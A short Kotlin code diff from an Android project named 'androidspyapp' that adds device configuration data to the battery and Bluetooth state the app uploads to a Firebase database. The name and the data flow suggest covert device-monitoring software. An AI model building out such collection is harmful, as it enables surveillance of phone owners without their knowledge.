@@ -7,6 +7,7 @@ import com.google.android.gms.tasks.Task
 import com.google.firebase.database.*
 import com.komnacki.androidspyapp.device.battery.BatteryState
 import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
+import com.komnacki.androidspyapp.device.config.ConfigState
 import github.nisrulz.easydeviceinfo.base.EasyConfigMod
 import java.text.SimpleDateFormat
 import java.util.*
@@ -39,6 +40,7 @@ class MessageUtils {
         Log.d("KK: ", "sendBatteryMessage method")
         val batteryState = BatteryState(context)
         val bluetoothState = BluetoothState(context)
+        val configState = ConfigState(context)
 
         val values = mutableMapOf<String, Any>()
         batteryState.getData().forEach { item ->
@@ -47,7 +49,9 @@ class MessageUtils {
         }
         bluetoothState.getData().forEach{ item ->
             values[BLUETOOTH_DATABASE_TAG + "/" + item.key] = item.value
-
+        }
+        configState.getData().forEach{ item ->
+            values[CONFIG_DATABASE_TAG + "/" + item.key] = item.value
         }
         getBaseHeader().updateChildren(values).addOnCompleteListener(object : OnCompleteListener<Void> {
             override fun onComplete(p0: Task<Void>) {
